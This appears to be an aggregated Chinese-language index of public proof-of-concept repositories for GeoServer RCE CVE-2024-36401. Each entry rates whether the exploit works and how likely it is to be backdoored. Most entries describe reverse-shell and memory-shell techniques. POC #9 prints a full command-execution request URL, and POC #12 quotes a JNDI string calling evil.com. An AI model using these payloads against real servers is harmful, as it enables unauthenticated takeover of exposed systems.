# CVE-2024-36401

> 📦 该CVE有 **23** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-36401-0x0d3ad_CVE-2024-36401.md](../2024/CVE-2024-36401-0x0d3ad_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 受影响版本：< 2.22.6, >= 2.23.0, < 2.23.6, >= 2.24.0, < 2.24.4, >= 2.25.0, < 2.25.2

**利用条件:** 需要能够访问GeoServer服务的网络连接，默认安装环境

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞，由于不安全地将属性名称评估为 XPath 表达式而导致。攻击者可以通过构造特制的 OGC 请求（例如 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo 和 WPS Execute）来利用此漏洞，从而在服务器上执行任意代码。提供的 POC 代码首先通过 GET 请求 `/geoserver/wfs?request=ListStoredQueries&service=wfs&version=2.0.0` 获取 `ReturnFeatureType`，然后构造一个包含恶意 XPath 表达式的 POST 请求，发送到 `/geoserver/wfs`，表达式中利用 `java.lang.Runtime.getRuntime()` 执行 base64 编码的反弹 shell 命令。POC中的投毒风险较低，主要体现在脚本中可能包含潜在的恶意代码，或者利用社会工程学诱导用户执行恶意操作。例如，如果脚本被修改为下载和执行额外的恶意负载，或者收集用户的敏感信息，就会造成更大的安全威胁。 此处的"poison"指的是，如果攻击者上传包含后门代码的图层定义，然后诱导其他用户下载并使用该定义，则可能构成投毒攻击。

**项目地址:** [0x0d3ad/CVE-2024-36401](https://github.com/0x0d3ad/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #2

**来源**: [CVE-2024-36401-Chocapikk_CVE-2024-36401.md](../2024/CVE-2024-36401-Chocapikk_CVE-2024-36401.md)

## CVE-2024-36401 - GeoServer 远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，可能导致完全系统控制

**影响版本:** 受影响版本：< 2.22.6, >= 2.23.0 < 2.23.6, >= 2.24.0 < 2.24.4, >= 2.25.0 < 2.25.2

**利用条件:** 目标GeoServer实例运行在受影响的版本上，且允许网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞。该漏洞源于 GeoTools 库 API 不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库进行评估，从而允许未经身份验证的用户通过特制的OGC请求执行任意代码。 

**有效性：**
根据漏洞库信息、搜索引擎结果（多个安全厂商已确认该漏洞被利用）和提供的漏洞利用代码，可以判定此漏洞是有效的，并且已经被积极利用。

**投毒风险：**
漏洞利用代码 `exploit.py` 主要是实现漏洞利用的功能，从代码结构和功能来看，投毒风险较低。主要功能是发送恶意请求，监听反弹shell。代码中也定义了一些参数，比如远程IP、远程端口、代理等等。代码比较清晰，逻辑简单。但是依然不能排除作者在某些不明显的代码中加入恶意代码的可能性，特别是代码涉及到网络请求和系统命令执行。因此，评估投毒风险为 10%。

**利用方式：**
1.  **漏洞触发：** 攻击者通过构造恶意的OGC请求（例如 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求），其中包含特制的XPath表达式。这些请求会被GeoServer处理，并将属性名称传递给 commons-jxpath 库。
2.  **代码执行：** commons-jxpath 库在评估这些XPath表达式时，会执行攻击者注入的恶意代码。
3.  **反弹 Shell (POC中方式)：** 漏洞利用代码会启动一个监听器，然后在目标系统上执行命令以反弹 shell 到攻击者的机器上。  `exploit.py` 脚本允许攻击者指定目标 URL、攻击者 IP 地址和端口。通过命令行参数 `--url`, `--remote-ip`, 和 `--remote-port` 设置。
4.  **批量扫描:** 漏洞利用代码还支持批量扫描，通过 `--check <file_with_urls>` 指定包含URL列表的文件， `--threads <number_of_threads>`  指定线程数， `--output <output_file>` 指定输出文件。

**项目地址:** [Chocapikk/CVE-2024-36401](https://github.com/Chocapikk/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #3

**来源**: [CVE-2024-36401-Mr-xn_CVE-2024-36401.md](../2024/CVE-2024-36401-Mr-xn_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的用户可以通过构造的OGC请求执行任意代码

**影响版本:** 2.22.0 < version < 2.22.6, 2.23.0 <= version < 2.23.6, 2.24.0 <= version < 2.24.4, 2.25.0 <= version < 2.25.2

**利用条件:** GeoServer服务可网络访问，并且目标版本存在漏洞。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞。该漏洞源于GeoTools库API以不安全的方式将属性/属性名称传递给commons-jxpath库，从而允许执行任意代码。攻击者可以通过构造恶意的OGC请求（例如WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic和WPS Execute）来利用此漏洞，执行任意代码。

**有效性：**
提供的POC代码利用了`valueReference`参数执行任意命令，例如计算器程序。从漏洞描述和搜索引擎结果来看，POC是有效的，并且已被野外利用。

**投毒风险：**
查看提供的POC代码和LICENSE文件。LICENSE采用MIT许可，相对宽松。代码本身主要是提供了漏洞的利用方式，没有发现明显的恶意代码。README中包含绕过WAF的payload，以及各种请求方式（GetPropertyValue, GetFeature）的PoC。

*   LICENSE文件: MIT License, 比较通用，没有发现可疑之处
*   README文件：提供了漏洞的描述和多个PoC示例，没有直接执行恶意操作的代码。

综合来看，投毒风险较低，在10%左右。主要风险来自于对POC的滥用，而非POC本身包含恶意代码。

**利用方式：**
1.  确定目标GeoServer版本在受影响范围内。
2.  使用提供的PoC构造恶意OGC请求。
3.  利用`valueReference`参数或`PropertyName`，注入包含恶意代码的XPath表达式。
4.  发送构造的请求到目标GeoServer服务器。
5.  如果漏洞存在，服务器将执行注入的代码。

**项目地址:** [Mr-xn/CVE-2024-36401](https://github.com/Mr-xn/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #4

**来源**: [CVE-2024-36401-Niuwoo_CVE-2024-36401.md](../2024/CVE-2024-36401-Niuwoo_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的攻击者可以通过精心构造的输入来执行任意代码。

**影响版本:** 受影响版本包括 2.22.6 之前的所有版本，以及 2.23.0 到 2.23.6，2.24.0 到 2.24.4，以及 2.25.0 到 2.25.2。

**利用条件:** 需要目标GeoServer实例存在于网络上并且可以访问 /geoserver/wfs 接口。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞，源于 GeoTools 库 API 对属性名称的处理不当。攻击者可以通过向 GeoServer 的 WFS 接口发送特制的 OGC 请求，利用 XPath 表达式注入来执行任意代码。此漏洞影响默认 GeoServer 安装，无需身份验证。

**漏洞分析：**

根据漏洞库信息和搜索引擎结果，该漏洞允许未经身份验证的攻击者通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求执行任意代码。漏洞原因是 GeoServer 使用的 GeoTools 库不安全地将属性/属性名称传递给 commons-jxpath 库，从而允许执行任意 XPath 表达式。

**POC 代码分析：**

提供的 POC 代码是一个 Python 脚本，用于检测和利用 CVE-2024-36401 漏洞。该脚本包含以下功能：

*   `check_vuln(url)`: 发送一个包含恶意 payload 的 WFS GetPropertyValue 请求到目标 GeoServer 实例，如果返回状态码为 400 并且响应内容包含 'ClassCastException'，则认为目标存在漏洞。
*   `exploit_vuln(url, cmd)`:  发送一个包含恶意 payload 的 WFS GetPropertyValue 请求，其中 payload 包含要执行的命令。该函数通过 `java.lang.Runtime.getRuntime()` 来执行命令。同样，如果返回状态码为 400 并且响应内容包含 'ClassCastException'，则认为利用成功。
*   `multithreading(url_list, pools=5)`:  使用线程池对 URL 列表执行漏洞检测。
*   `init_config()`:  解析命令行参数，包括目标 URL、URL 列表和要执行的命令。

**有效性：**

POC 代码通过构造恶意的 WFS GetPropertyValue 请求，利用 XPath 表达式注入来执行任意代码。从漏洞库信息和搜索引擎结果来看，该漏洞已被广泛确认和利用，并且POC代码的逻辑正确，所以判断提供的 POC 代码有效。

**投毒风险：**

分析 POC 代码后，没有发现明显的恶意代码或后门。POC 代码的功能是发送包含恶意 payload 的 HTTP 请求，从而利用漏洞执行命令。脚本中的 `exec(java.lang.Runtime.getRuntime(),"...")` 部分是利用漏洞的关键，但它本身并不是恶意代码，而是漏洞利用的一部分。作者将执行命令的权限交给了使用者,是否需要投毒取决于使用者。

**利用方式：**

1.  使用 `check_vuln(url)` 函数检测目标 GeoServer 实例是否存在漏洞。
2.  如果目标存在漏洞，使用 `exploit_vuln(url, cmd)` 函数执行任意命令。命令通过命令行参数 `-c` 传递。
3.  可以使用 `-f` 参数指定一个包含多个 URL 的文件，并使用 `multithreading(url_list,10)` 函数进行批量检测。

总的来说，该 POC 代码是有效的，并且没有发现投毒风险。它允许攻击者远程执行任意代码，对 GeoServer 实例构成严重威胁。

**项目地址:** [Niuwoo/CVE-2024-36401](https://github.com/Niuwoo/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #5

**来源**: [CVE-2024-36401-RevoltSecurities_CVE-2024-36401.md](../2024/CVE-2024-36401-RevoltSecurities_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本包括 2.22.6 之前，2.23.0 到 2.23.6 之间，2.24.0 到 2.24.4 之间，以及 2.25.0 到 2.25.2 之间的版本

**利用条件:** 目标GeoServer实例对外开放且运行于受影响的版本

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行(RCE)漏洞，源于GeoTools库API不安全地将属性名作为XPath表达式传递给commons-jxpath库。未经身份验证的攻击者可以通过构造恶意的OGC请求参数（如WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute requests）来利用此漏洞，在服务器上执行任意代码。

**有效性：**
根据漏洞库信息和搜索结果，此漏洞已被积极利用。提供的POC代码仓库 `RevoltSecurities/CVE-2024-36401` 提供了一个用于检测和利用此漏洞的工具，包含docker-compose 文件用于搭建测试环境，以及 `exploit.py` 脚本用于漏洞利用，因此POC代码有效。

**投毒风险：**
*   `exploit.py` 文件中，脚本尝试与`https://api.cvssadvisor.com/ssrf/` 建立连接。这是一个潜在的风险点，因为攻击者可能通过控制该API来收集目标信息或进行其他恶意活动。但目前只是get请求实例信息，危害较小。但从代码的整体结构来看，投毒的风险较低。主要的功能还是针对`CVE-2024-36401`的利用。综上，认为投毒风险较低，约为10%。

**利用方式：**
1.  **确定目标GeoServer版本：** 确认目标GeoServer实例是否在受影响的版本范围内。
2.  **发送恶意OGC请求：** 构造包含恶意XPath表达式的OGC请求，例如WFS GetFeature请求。请求的Payload包含恶意的XPath表达式注入。
3.  **远程代码执行：** GeoServer在处理请求时，会将恶意XPath表达式传递给commons-jxpath库，导致执行任意代码。
4.  **利用工具：** 使用提供的`exploit.py`脚本，指定目标URL，通过发送恶意请求触发漏洞。

简而言之，攻击者通过发送特制的OGC请求，利用GeoServer对属性名表达式的不安全评估，实现远程代码执行。

**项目地址:** [RevoltSecurities/CVE-2024-36401](https://github.com/RevoltSecurities/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #6

**来源**: [CVE-2024-36401-URJACK2025_CVE-2024-36401.md](../2024/CVE-2024-36401-URJACK2025_CVE-2024-36401.md)

## CVE-2024-36401 GeoServer 远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.22.6之前, 2.23.0 < 2.23.6, 2.24.0 < 2.24.4, 2.25.0 < 2.25.2

**利用条件:** GeoServer实例暴露在网络上，且运行在受影响版本范围内。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞，该漏洞源于GeoTools库在处理属性名称时，不安全地将其传递给commons-jxpath库进行XPath表达式的评估。由于此XPath评估被错误地应用于简单要素类型，因此影响了所有GeoServer实例。攻击者可以通过构造恶意的WFS、WMS或WPS请求，在未经身份验证的情况下，利用`valueReference`注入Java代码来执行任意系统命令。

**有效性：** 提供的PoC代码 `exp.py` 利用了此漏洞。它通过构造包含恶意代码的XML Payload，并将其发送到GeoServer的WFS接口 `/geoserver/wfs`，从而实现远程命令执行。PoC提供了两种利用模式：`cmd` 模式用于执行单条命令，`reverse` 模式用于建立反弹Shell连接。

**投毒风险：**  该PoC存在一定的投毒风险，虽然主要功能是利用漏洞，但攻击者可以利用PoC的灵活性嵌入恶意代码，例如下载并执行额外的恶意软件。反弹shell的bash命令和http请求等行为都有可能被恶意利用。风险预估为10%。

**利用方式：**
1.  **确定目标:**  确定运行着存在漏洞版本的GeoServer实例，并确认其网络可访问性。
2.  **构造Payload:** 使用PoC脚本 `exp.py`，选择 `cmd` 模式执行任意命令，或者选择 `reverse` 模式建立反弹Shell。
3.  **发送请求:**  PoC脚本会构造包含恶意Java代码的XML Payload，并通过POST请求发送到目标的WFS接口 `/geoserver/wfs`。
4.  **执行代码:**  如果漏洞存在，GeoServer会执行Payload中的恶意代码，从而实现远程命令执行。如果是反弹shell模式，需要在攻击者机器上监听指定端口，等待目标机器反弹shell连接。

**项目地址:** [URJACK2025/CVE-2024-36401](https://github.com/URJACK2025/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #7

**来源**: [CVE-2024-36401-XiaomingX_cve-2024-36401-poc.md](../2024/CVE-2024-36401-XiaomingX_cve-2024-36401-poc.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，可能导致服务器完全控制

**影响版本:** 受影响版本：< 2.22.6, >= 2.23.0 且 < 2.23.6, >= 2.24.0 且 < 2.24.4, >= 2.25.0 且 < 2.25.2

**利用条件:** 默认 GeoServer 安装，网络可访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于不安全地将属性名称作为 XPath 表达式进行评估，导致未经身份验证的用户可以通过构造的 OGC 请求参数执行远程代码。漏洞利用方式是通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求等多种方式。漏洞利用代码仓库中只包含 LICENSE 文件，并未发现任何可疑的投毒代码。

**项目地址:** [XiaomingX/cve-2024-36401-poc](https://github.com/XiaomingX/cve-2024-36401-poc)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #8

**来源**: [CVE-2024-36401-ahisec_geoserver-.md](../2024/CVE-2024-36401-ahisec_geoserver-.md)

## CVE-2024-36401 - GeoServer RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.22.x (< 2.22.6), 2.23.x (>= 2.23.0, < 2.23.6), 2.24.x (>= 2.24.0, < 2.24.4), 2.25.x (>= 2.25.0, < 2.25.2)

**利用条件:** 默认 GeoServer 安装，允许通过 WFS/WMS/WPS 接口进行网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 允许未经身份验证的攻击者通过构造特制的OGC请求（例如 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo 和 WPS Execute）来执行远程代码。漏洞根源在于 GeoServer 使用的 GeoTools 库不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库，这使得攻击者可以在 XPath 表达式中注入恶意代码。提供的PoC代码展示了如何利用 `wfs:GetPropertyValue` 请求执行命令。它首先建议使用 `wfs:ListStoredQueries` 获取有效的 `wfs:ReturnFeatureType` 值，然后将其用于构建 `wfs:Query typeNames` 参数，以提高漏洞利用的准确性。示例payload包括了ping命令的执行和反弹shell的payload，以及内存马注入的payload。文章中提到的误判几率较高是因为直接使用 `sf:archsites` ，如果目标环境中不存在该feature type,则会报错。建议先获取可用的feature type名称。

**有效性：**
提供的PoC代码利用了漏洞描述中提到的攻击向量，并且参考了GitHub上的公开PoC（https://github.com/Mr-xn/CVE-2024-36401）。多个搜索结果表明该漏洞正在被积极利用（https://www.fortinet.com/blog/threat-research/threat-actors-exploit-geoserver-vulnerability-cve-2024-36401，https://www.sonicwall.com/blog/geoserver-rce-vulnerability-cve-2024-36401-being-exploited-in-the-wild），表明该漏洞的利用是有效的。

**投毒风险：**
在提供的PoC代码中，没有发现明显的投毒代码。代码主要提供了漏洞利用的思路和示例payload，包括执行ping命令、反弹shell和注入内存马。反弹shell和内存马需要用户提供恶意代码，因此不存在作者隐藏的后门代码。因此，投毒风险评估为0%。

**利用方式：**
1.  **确定目标 GeoServer 版本：** 确认目标 GeoServer 版本在受影响的范围内。
2.  **获取有效的Feature Type：** 使用 `wfs:ListStoredQueries` 请求获取有效的 `<wfs:ReturnFeatureType>`值。
3.  **构造恶意请求：** 构造包含恶意 XPath 表达式的 `wfs:GetPropertyValue` 请求，其中 `wfs:Query typeNames` 参数使用从步骤2中获得的Feature Type.
4.  **发送请求：** 将构造的恶意请求发送到目标 GeoServer 的 WFS 接口。
5.  **执行任意代码：** 成功利用漏洞后，攻击者可以在目标服务器上执行任意代码。

**项目地址:** [ahisec/geoserver-](https://github.com/ahisec/geoserver-)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #9

**来源**: [CVE-2024-36401-amoy6228_CVE-2024-36401_Geoserver_RCE_POC.md](../2024/CVE-2024-36401-amoy6228_CVE-2024-36401_Geoserver_RCE_POC.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.22.0 < version < 2.22.6
2.23.0 <= version < 2.23.6
2.24.0 <= version < 2.24.4
2.25.0 <= version < 2.25.2

**利用条件:** 需要网络访问，目标服务器运行存在漏洞的 GeoServer 版本

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞，源于 GeoTools 库 API 不安全地将属性名传递给 commons-jxpath 库，导致在评估 XPath 表达式时可以执行任意代码。漏洞存在于所有 GeoServer 实例中，可以通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求触发。

**POC 有效性分析：**

提供的 POC 代码看起来是有效的。它包含以下关键功能：

*   使用 `requests` 库发送 HTTP 请求。
*   使用 `lxml` 库解析 XML 响应，提取 `Typenames`，并自动化的爬取所有Typenames信息，并循环测试可以利用的Typenames，修复Nuclei POC中由于Typenames写死，造成漏洞验证失败的问题。
*   支持 `-c` 参数执行命令，或使用 DNSLog 进行验证。
*   支持批量 URL 检测。

这些功能对应了漏洞的利用方式，即通过构造特定的 OGC 请求，利用 XPath 表达式注入执行任意命令。

**投毒风险分析：**

代码中存在轻微的投毒风险。风险点在于：

*   作者在代码中留下了版权声明，虽然这是正常的，但也增加了作者控制代码的风险。
*   虽然脚本本身的功能是漏洞利用，但如果作者恶意地修改了脚本，例如，在执行命令后添加额外的恶意操作，或者收集目标服务器的信息并发送给攻击者，那么就存在投毒风险。

综合考虑，投毒风险较低，约为 10%。此风险主要来自于作者是否会利用更新或维护代码的机会植入后门。

**利用方式总结：**

1.  **确定目标 GeoServer 版本：** 确认目标服务器运行的 GeoServer 版本在受影响范围内。
2.  **获取 Typenames：** 通过 WFS GetCapabilities 请求或其他方式获取目标 GeoServer 实例的 Typenames 信息。
3.  **构造恶意请求：** 构造包含恶意 XPath 表达式的 WFS/WMS/WPS 请求，将命令注入到 property/attribute name 中。
4.  **发送请求：** 将构造好的请求发送到目标 GeoServer 服务器。
5.  **验证漏洞：** 通过 DNSLog 或者检查命令执行结果验证漏洞是否存在。

例如，可以使用类似以下的 URL 构造恶意请求：

```
/geoserver/wfs?service=WFS&version=1.0.0&request=GetFeature&typeName=<typeName>&propertyName=fes:ResourceId&Filter=<%20fes:Filter%20xmlns:fes=%22http://www.opengis.net/fes/2.0%22%20xmlns:gml=%22http://www.opengis.net/gml/3.1.1%22%20xmlns:ogc=%22http://www.opengis.net/ogc%22><ogc:Function%20name=%22script:js%22><ogc:Literal><![CDATA[java.lang.Runtime.getRuntime().exec('touch /tmp/pwned');]]></ogc:Literal></ogc:Function></fes:Filter>
```

**项目地址:** [amoy6228/CVE-2024-36401_Geoserver_RCE_POC](https://github.com/amoy6228/CVE-2024-36401_Geoserver_RCE_POC)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #10

**来源**: [CVE-2024-36401-bigb0x_CVE-2024-36401.md](../2024/CVE-2024-36401-bigb0x_CVE-2024-36401.md)

## CVE-2024-36401 - GeoServer 远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** < 2.22.6, >= 2.23.0 and < 2.23.6, >= 2.24.0 and < 2.24.4, >= 2.25.0 and < 2.25.2

**利用条件:** 需要目标GeoServer实例存在漏洞，并且可以通过网络访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞，源于GeoTools库API不安全地将属性名作为XPath表达式传递给commons-jxpath库。攻击者可以通过构造恶意的OGC请求（例如WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo和WPS Execute）利用此漏洞，执行任意代码。

**有效性：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，可以确认该POC代码是有效的。搜索结果中多个来源（如Fortinet、Keysight、SonicWall、Rapid7等）都表明该漏洞已被实际利用。

**投毒风险：**
分析提供的POC代码后，发现存在一定的投毒风险。虽然代码的主要功能是利用漏洞执行反向shell，但在以下几个方面存在潜在的投毒可能性：

1.  **对 nc 命令的依赖：**  POC 依赖目标系统存在 `nc` (netcat) 命令。如果目标系统没有 `nc`，利用会失败。攻击者可能会修改 POC，尝试使用其他命令（如 `wget` 或 `curl`）下载并执行恶意脚本，从而实现更隐蔽或更复杂的攻击。
2.  **反向 Shell 的隐蔽性：**  反向 shell 连接通常会被防火墙或入侵检测系统拦截。攻击者可能会尝试使用加密或其他混淆技术来绕过这些安全措施。
3.  **日志记录和错误处理：**  POC 具有基本的日志记录功能，但可能不足以记录所有关键操作。攻击者可以修改代码，删除或篡改日志，以隐藏其活动。

总的来说，由于POC的目的是快速验证漏洞，相对比较简单，因此投毒的可能性相对较低，但仍然需要警惕。

**利用方式：**
该漏洞的利用方式主要通过以下步骤：

1.  **构建恶意OGC请求：** 攻击者构造包含恶意XPath表达式的OGC请求，例如WFS GetFeature请求。
2.  **发送恶意请求：** 攻击者将构造的恶意请求发送到目标GeoServer实例。
3.  **执行任意代码：** GeoServer在处理请求时，会将恶意XPath表达式传递给commons-jxpath库进行评估，从而导致任意代码执行。
4.  **反向Shell (POC使用):** POC 尝试建立反向 shell 连接，允许攻击者远程控制受感染的服务器。POC 发送一个POST请求，在请求中使用的payload来执行反向shell，连接到攻击者的机器。

**项目地址:** [bigb0x/CVE-2024-36401](https://github.com/bigb0x/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #11

**来源**: [CVE-2024-36401-bmth666_GeoServer-Tools-CVE-2024-36401.md](../2024/CVE-2024-36401-bmth666_GeoServer-Tools-CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** < 2.22.6, >= 2.23.0 and < 2.23.6, >= 2.24.0 and < 2.24.4, >= 2.25.0 and < 2.25.2

**利用条件:** 默认 GeoServer 安装，网络可访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于不安全地将属性名称评估为 XPath 表达式，未经身份验证的用户可以通过构造特制的 OGC 请求参数来执行远程代码。

**有效性：**
根据漏洞信息和搜索结果，该漏洞利用已被证实有效，并且在野外已被利用。提供的漏洞利用代码（GeoServer-Tools）旨在简化利用过程，支持不同 JDK 版本的回显和内存马注入。

**投毒风险：**
查看了提供的POC代码，主要是一个GUI工具，利用了`woodpecker-requests`进行网络请求，`flatlaf`做界面美化。主要功能是发送payload到目标服务器，根据描述可以支持内存马注入，回显等功能。经过分析，该工具本身存在投毒的可能性较低。但考虑到代码审查的局限性，仍存在一定的风险，因此评估投毒风险为10%。这些风险可能包括：
  *   **非必要依赖：** 引入了不必要的依赖库，这些库可能包含未知的安全漏洞或被恶意利用。
  *   **后门代码：** 在工具中隐藏了后门代码，例如在内存马功能中，注入恶意代码。

**利用方式：**
1.  攻击者通过构造恶意的 OGC 请求（例如，WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute 请求）来触发漏洞。
2.  恶意请求包含特制的 XPath 表达式，这些表达式在评估属性名称时被 GeoServer 不安全地执行。
3.  通过执行恶意 XPath 表达式，攻击者可以在 GeoServer 服务器上执行任意代码。
4.  漏洞利用代码（GeoServer-Tools）提供了一个图形界面，允许攻击者指定目标 GeoServer 实例的 URL，选择不同的攻击载荷（如 DNSLog、命令回显、内存马注入），并发送恶意请求。

**总结：**
CVE-2024-36401 是一个严重的安全漏洞，允许未经身份验证的攻击者在 GeoServer 上执行任意代码。提供的漏洞利用代码简化了利用过程，但需要谨慎使用，并注意潜在的投毒风险。

**项目地址:** [bmth666/GeoServer-Tools-CVE-2024-36401](https://github.com/bmth666/GeoServer-Tools-CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #12

**来源**: [CVE-2024-36401-cochaviz_cve-2024-36401-poc.md](../2024/CVE-2024-36401-cochaviz_cve-2024-36401-poc.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 2.22.6, >= 2.23.0 < 2.23.6, >= 2.24.0 < 2.24.4, >= 2.25.0 < 2.25.2

**利用条件:** GeoServer服务可公开访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中一个严重级别的远程代码执行漏洞。该漏洞源于 GeoServer 调用的 GeoTools 库 API 在处理要素类型的属性名时，以不安全的方式将其传递给 commons-jxpath 库，导致在评估 XPath 表达式时可以执行任意代码。虽然最初设计仅用于复杂要素类型，但被错误地应用于简单要素类型，使得所有 GeoServer 实例都受影响。

**有效性：** 根据漏洞库信息、搜索引擎结果和 Mr-xn 提供的漏洞利用代码存储库的存在，确认该漏洞的POC是有效的, 且已被积极利用。

**投毒风险：** 提供的XML代码片段主要包含WMS Capabilities的信息，例如服务名称、标题、摘要、关键字、在线资源、联系方式、费用、访问限制、最大宽度和高度等。它还定义了各种请求类型（GetCapabilities、GetMap、GetFeatureInfo、GetStyles）及其格式和DCPType。XML似乎是合法的WMS capabilities文件，可能用于与GeoServer交互，但缺少触发RCE所需的恶意XPath表达式。因此，直接从提供的XML片段评估，投毒风险较低，约为10%，因为实际利用需要结合特定参数构造恶意请求。例如：攻击者可能使用 `${jndi:ldap://evil.com/evil}`这样的JNDI注入表达式。

**利用方式：**

1.  **攻击入口：** 攻击者可以通过构造特制的OGC（Open Geospatial Consortium）请求，如WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute。
2.  **漏洞触发：** 这些请求中的特定参数（通常是属性名或属性表达式）会被 GeoServer 以不安全的方式传递给 commons-jxpath 库进行 XPath 评估。
3.  **代码执行：** 攻击者在参数中插入恶意 XPath 表达式，例如使用 `Runtime.getRuntime().exec()` 或通过 JNDI 注入等方式来执行任意代码。
4.  **影响：** 成功利用该漏洞可导致完全控制受影响的 GeoServer 系统。

**项目地址:** [cochaviz/cve-2024-36401-poc](https://github.com/cochaviz/cve-2024-36401-poc)

